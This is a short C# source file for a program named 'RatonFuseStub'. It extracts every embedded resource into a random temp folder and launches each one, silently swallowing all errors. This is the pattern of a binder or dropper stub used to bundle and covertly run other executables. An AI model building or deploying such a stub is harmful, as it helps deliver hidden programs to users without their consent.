using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace RatonFuseStub
{
    internal static class Program
    {
        [STAThread]
        static void Main()
        {
            try
            {
                string tempDir = Path.Combine(
                    Path.GetTempPath(),
                    "ratonfuse_" + Guid.NewGuid().ToString("N")
                );

                Directory.CreateDirectory(tempDir);

                Assembly asm = Assembly.GetExecutingAssembly();

                foreach (string res in asm.GetManifestResourceNames())
                {
                    if (res.EndsWith(".resources"))
                        continue;

                    using (Stream s = asm.GetManifestResourceStream(res))
                    {
                        if (s == null || s.Length == 0)
                            continue;

                        string asmName = asm.GetName().Name + ".";
                        string name = res.StartsWith(asmName)
                            ? res.Substring(asmName.Length)
                            : res;
                        string outPath = Path.Combine(tempDir, name);

                        using (FileStream fs = new FileStream(outPath, FileMode.Create, FileAccess.Write))
                            s.CopyTo(fs);

                        Process.Start(new ProcessStartInfo
                        {
                            FileName = outPath,
                            UseShellExecute = true
                        });
                    }
                }
            }
            catch
            {
            }
        }
    }
}
